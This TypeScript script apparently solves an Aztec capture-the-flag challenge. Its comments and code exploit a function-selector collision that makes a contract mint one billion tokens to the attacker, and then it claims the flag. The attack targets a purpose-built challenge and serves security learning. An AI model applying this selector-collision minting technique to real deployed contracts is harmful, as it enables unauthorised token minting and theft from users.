import { parseArgs } from "node:util";

import { AztecAddress } from "@aztec/aztec.js/addresses";
import { Fr } from "@aztec/aztec.js/fields";
import { createAztecNodeClient } from "@aztec/aztec.js/node";
import { TokenContractArtifact } from "@defi-wonderland/aztec-standards/dist/src/artifacts/Token.js";
import { Capsule } from "@aztec/stdlib/tx";
import { getContractInstanceFromInstantiationParams } from "@aztec/stdlib/contract";
import { poseidon2Hash } from "@aztec/foundation/crypto/poseidon";
import { deriveStorageSlotInMap } from "@aztec/stdlib/hash";

import {
  TheObservatoryContract,
  TheObservatoryContractArtifact,
} from "../../../src/artifacts/TheObservatory.ts";
import { TheObservatorySolverContract } from "../../../src/artifacts/TheObservatorySolver.ts";
import { FlagEmitterContract } from "../../../src/artifacts/FlagEmitter.ts";
import {
  BASE_PARSE_ARGS_OPTIONS,
  createWalletContext,
  fail,
  getTxWaitOptions,
  loadTestnetConfig,
  parseAddress,
  registerContractAllowAlreadyRegistered,
  resolveBaseOptions,
  setupFpcPayment,
} from "../../lib/shared.ts";

/**
 * THE OBSERVATORY -- Selector Collision Exploit
 *
 * Key knowledge
 * -------------
 * 1. Function selectors: Aztec computes 4-byte selectors via
 *    poseidon2_hash_bytes(signature) & 0xFFFFFFFF. Two functions with
 *    different signatures can share a selector (collision). Cross-contract
 *    calls dispatch by selector alone, so a collision lets one function
 *    impersonate another.
 *
 * 2. The collision: consume_shk_6237885(Field,Field) has selector 0xf8f84119
 *    -- the same as mint_to_private((Field), u128) on the Token contract.
 *    observe_shk_6237885 dispatches to a user-supplied satellite via
 *    StellarInterface. By passing the Token address as the "satellite",
 *    the Observatory (as the token's minter) accidentally calls
 *    mint_to_private, minting arbitrary SMU tokens to the attacker.
 *
 * 3. Capsules: spectrum() reads a wavelength from a transient capsule.
 *    Attach a Capsule(contract, WAVELENGTH_SLOT, [data]) to the tx.
 *    WAVELENGTH_SLOT = poseidon2_hash_bytes("WAVELENGTH_SLOT").
 *
 * 4. Satellite callback: The observe badge requires the FULL protocol --
 *    observe -> satellite callback (anonymous) -> retrieve. Deploy a
 *    satellite that implements consume_shk_6237885 and calls back
 *    report_reading_shk_6237885 with hide_msg_sender=true in the same tx.
 *
 * 5. Storage slot derivation: Aztec Map derives storage slots with a
 *    domain-separated hash (poseidon2_hash_with_separator), NOT plain
 *    poseidon2_hash. Use deriveStorageSlotInMap() from @aztec/stdlib/hash
 *    to read observation_mass from on-chain storage before calling retrieve.
 *
 * Steps:
 *   1. Scan (earn scan badge)
 *   2. Spectrum with capsule (earn spectrum badge)
 *   3. Deploy satellite, observe -> callback -> retrieve (earn observe badge)
 *   4. Observe the TOKEN as satellite (collision mints 1B SMU)
 *   5. Singularity (burn 1B SMU + consume badges + emit flag)
 */

const SINGULARITY_MASS = 1_000_000_000n;
const CALLBACK_READING = new Fr(100n);

// poseidon2_hash_bytes("WAVELENGTH_SLOT") -- matches the comptime global in the contract
const WAVELENGTH_SLOT = Fr.fromString(
  "0x1e3011eabe5c856685a64cee4fe305bae55533df11ad701ed5eb6b39d58a8efa",
);

function printHelp() {
  console.log(`Usage: yarn capture:observatory [options]

Options:
  --node-url <url>           Override the Aztec node URL
  --pxe-data-dir <path>      Override the PXE data directory
  --secret-key <hex>         Deployer secret key
  --fpc-address <addr>       SponsoredFPC address
  --fpc-salt <hex>           SponsoredFPC salt
  --deployment-salt <hex>    Salt for account derivation
  --fresh-pxe                Clear PXE data directory before starting
  --help                     Show this message`);
}

const args = parseArgs({ options: BASE_PARSE_ARGS_OPTIONS });

if (args.values.help) {
  printHelp();
  process.exit(0);
}

const opts = resolveBaseOptions(args);
const cfg = loadTestnetConfig();

const emitterAddress = cfg.flagEmitter
  ? parseAddress(cfg.flagEmitter)
  : fail("Missing flagEmitter in testnet.json.");

async function main() {
  const ctx = await createWalletContext(opts);
  const player = ctx.deployer;
  const node = createAztecNodeClient(opts.nodeUrl, {});
  const wait = getTxWaitOptions();
  const fee = await setupFpcPayment(ctx.wallet, opts);
  const sendOpts = { from: player, fee, wait } as any;

  // Derive the Observatory address from the emitter (constructor only takes flag_emitter)
  const observatoryInstance = await getContractInstanceFromInstantiationParams(
    TheObservatoryContractArtifact,
    {
      salt: Fr.ZERO,
      constructorArgs: [emitterAddress],
      deployer: AztecAddress.ZERO,
    },
  );
  const { address: challengeAddress } = observatoryInstance;

  await registerContractAllowAlreadyRegistered(
    ctx.wallet,
    observatoryInstance,
    TheObservatoryContractArtifact,
  );

  const observatory = TheObservatoryContract.at(challengeAddress, ctx.wallet);

  // Read the Token address from the Observatory's view function
  const { result: tokenAddress } = await observatory.methods
    .get_smu_token()
    .simulate({ from: player });

  console.log(`player    = ${player.toString()}`);
  console.log(`challenge = ${challengeAddress.toString()}`);
  console.log(`token     = ${(tokenAddress as AztecAddress).toString()}`);
  console.log(`emitter   = ${emitterAddress.toString()}`);

  // Register the token so the PXE can simulate calls that touch it (e.g. singularity → burn)
  const tokenInstance = await node.getContract(tokenAddress as AztecAddress);
  if (!tokenInstance) {
    throw new Error(
      `Token instance not found on-chain: ${(tokenAddress as AztecAddress).toString()}`,
    );
  }
  await registerContractAllowAlreadyRegistered(
    ctx.wallet,
    tokenInstance,
    TokenContractArtifact,
  );

  // Early exit if already captured
  const emitter = FlagEmitterContract.at(emitterAddress, ctx.wallet);
  const { result: alreadyCaptured } = await emitter.methods
    .is_captured(challengeAddress, player)
    .simulate({ from: player });
  if (alreadyCaptured) {
    console.log("Challenge already captured!");
    return;
  }

  const playerField = player.toField();

  // Step 1: Passive scan (earns scan badge)
  console.log("\n[1/5] Performing passive radiation scan...");
  await observatory.methods.scan().send(sendOpts);
  console.log("Scan badge earned.");

  // Step 2: Spectrum analysis with capsule (earns spectrum badge)
  console.log("[2/5] Performing spectrum analysis...");
  const wavelengthCapsule = new Capsule(
    challengeAddress,
    WAVELENGTH_SLOT,
    [new Fr(42n)],
    challengeAddress,
  );
  await observatory.methods
    .spectrum()
    .with({ capsules: [wavelengthCapsule] })
    .send(sendOpts);
  console.log("Spectrum badge earned.");

  // Step 3: Legitimate satellite observe flow (earns observe badge)
  console.log("[3/5] Deploying satellite and performing observation...");
  const { contract: satellite } = await TheObservatorySolverContract.deploy(
    ctx.wallet,
  ).send(sendOpts);
  console.log(`satellite = ${satellite.address.toString()}`);

  await observatory.methods
    .observe_shk_6237885(satellite.address, playerField, CALLBACK_READING)
    .send(sendOpts);
  console.log("Observation completed.");

  // Read the stored mass using domain-separated map slot derivation
  const observationKey = await poseidon2Hash([
    playerField,
    satellite.address.toField(),
    playerField,
  ]);
  const derivedSlot = await deriveStorageSlotInMap(
    TheObservatoryContract.storage.observation_mass.slot,
    { toField: () => observationKey },
  );
  const storedMass = (
    await node.getPublicStorageAt("latest", challengeAddress, derivedSlot)
  ).toBigInt();
  console.log(`storedMass = ${storedMass} SMU`);

  await observatory.methods
    .retrieve(satellite.address, playerField, storedMass)
    .send(sendOpts);
  console.log("Observe badge earned via retrieve.");

  // Step 4: THE EXPLOIT -- observe the Token as a satellite
  // consume_shk_6237885(Field,Field) collides with mint_to_private((Field),u128) == 0xf8f84119
  console.log("[4/5] Observing the token contract (collision exploit)...");
  await observatory.methods
    .observe_shk_6237885(
      tokenAddress as AztecAddress,
      playerField,
      new Fr(SINGULARITY_MASS),
    )
    .send(sendOpts);
  console.log(`Minted ${SINGULARITY_MASS} SMU via collision.`);

  // Step 5: Declare singularity (burns 1B SMU + consumes all 3 badges + emits flag)
  console.log("[5/5] Declaring gravitational singularity...");
  await observatory.methods.singularity().send(sendOpts);

  console.log("\nSINGULARITY ACHIEVED -- FLAG CAPTURED");
  console.log(`solver    = ${player.toString()}`);
  console.log(`challenge = ${challengeAddress.toString()}`);
}

await main().catch((error: unknown) => {
  console.error("Fatal error:", error);
  process.exitCode = 1;
});
